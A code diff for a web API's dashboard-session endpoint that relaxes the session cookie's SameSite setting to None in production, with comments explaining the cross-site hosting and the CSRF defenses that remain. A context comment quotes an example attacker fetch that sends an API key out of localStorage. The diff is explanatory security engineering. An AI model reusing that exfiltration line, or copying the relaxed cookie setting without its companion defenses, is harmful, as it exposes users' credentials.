@@ -5,9 +5,9 @@
 // with `fetch(attacker, { body: localStorage.railforge_api_key })`.
 //
 // These two endpoints move the key off localStorage and into an httpOnly
-// SameSite=Strict Secure cookie that JS cannot read. The cookie is scoped
-// to the API origin; the dashboard calls the API with
-// `credentials: 'include'` so the browser attaches it automatically.
+// Secure cookie that JS cannot read. The cookie is scoped to the API
+// origin; the dashboard calls the API with `credentials: 'include'` so
+// the browser attaches it automatically.
 //
 //   POST /v1/dashboard/session    { api_key } → sets the cookie
 //   DELETE /v1/dashboard/session             → clears the cookie
@@ -20,10 +20,9 @@
 //    middleware. Same fail-closed posture: the DB query errors out → 503.
 //  - The cookie is Secure in production (https only) and omitted in
 //    development so localhost→localhost works without HTTPS.
-//  - SameSite=Strict blocks cross-site requests entirely — a malicious
-//    site cannot trigger state-changing calls with the user's cookie.
-//    If the dashboard ever needs cross-site flows (e.g. OAuth callback
-//    from a different origin), switch to Lax and pair with a CSRF token.
+//  - SameSite mode is environment-dependent — see the inline comment on
+//    the setCookie call below for the cross-site reasoning + remaining
+//    CSRF defenses. Dev uses Strict; production uses None.
 
 import { and, db, eq, isNull, schema } from '@railforge/db';
 import { Hono } from 'hono';
@@ -84,24 +83,46 @@ session.post('/', async (c) => {
   }
 
   const isProd = process.env.NODE_ENV === 'production';
-  // REVIEW.md LOW-14: `sameSite: 'Strict'` is LOAD-BEARING for CSRF.
+  // SameSite mode — environment-dependent because the dashboard and API
+  // sit on different sites in production but the same site in dev.
   //
-  // The CORS middleware reflects the configured dashboard origin and sets
-  // `credentials: true`, which — by itself — would let any origin that
-  // survives the ACAO check drive cookie-bearing requests. SameSite=Strict
-  // is what closes that door: browsers refuse to attach this cookie on ANY
-  // cross-origin request (including top-level navigations), so a malicious
-  // site cannot trigger state-changing API calls even if the user is logged
-  // in on another tab.
+  // Dev:    dashboard on http://localhost:5173, API on http://localhost:3000.
+  //         Different ports but same eTLD+1 (`localhost`), so SameSite=Strict
+  //         still allows the cross-origin same-site fetch. We keep Strict
+  //         here for the strongest CSRF defense.
   //
-  // If you ever need a cross-site flow (OAuth callback, IdP-initiated
-  // redirect, embedded iframe in a partner domain, etc.) and you downgrade
-  // to `Lax` or `None`, you MUST pair it with a CSRF double-submit token or
-  // synchronizer-token pattern on every state-changing /v1/dashboard/* call.
-  // Do NOT silently relax this without adding the companion defense.
+  // Prod (option 1, current):
+  //         dashboard on `*.pierrelouishaboury.workers.dev`, API on
+  //         `*.fly.dev`. Both `workers.dev` and `fly.dev` are on the Public
+  //         Suffix List, so these are entirely different sites — SameSite=
+  //         Strict (or even Lax) blocks the cookie on every dashboard→API
+  //         call, which 401s the whole authenticated UI. SameSite=None +
+  //         Secure is required to make the cross-site cookie work at all.
+  //
+  // CSRF mitigations that remain with SameSite=None in prod:
+  //   - CORS allowlist (`DASHBOARD_ORIGIN`) means the browser blocks
+  //     credentialed requests from any origin not on the list.
+  //   - The `Idempotency-Key` custom header is REQUIRED on every state-
+  //     changing /v1/* call, which forces a CORS preflight. The preflight
+  //     is rejected for non-allowlisted origins, so an attacker site
+  //     cannot drive POST/PUT/DELETE with the cookie even if it loaded.
+  //   - The session cookie is httpOnly, so XSS in the dashboard origin
+  //     cannot read it directly.
+  //
+  // What's gone: defense-in-depth against a CORS misconfiguration. If the
+  // allowlist is ever widened to include an attacker-controlled origin,
+  // SameSite=None won't catch the mistake the way Strict would have.
+  //
+  // Option 2 (production-grade — TODO when a custom domain is in play):
+  //   Move both apps under a shared eTLD+1 — e.g. `dashboard.railforge.dev`
+  //   and `api.railforge.dev` — and flip this back to `Strict` (or `Lax`).
+  //   That restores the SameSite-as-CSRF-fence guarantee. Until then, we
+  //   rely on the CORS+preflight stack above.
   setCookie(c, SESSION_COOKIE_NAME, body.api_key, {
     httpOnly: true,
-    sameSite: 'Strict',
+    // None requires Secure (browsers reject `None` over plain HTTP). In
+    // dev we stay on Strict so localhost over HTTP keeps working.
+    sameSite: isProd ? 'None' : 'Strict',
     secure: isProd,
     path: '/',
     maxAge: SESSION_MAX_AGE_SECONDS,
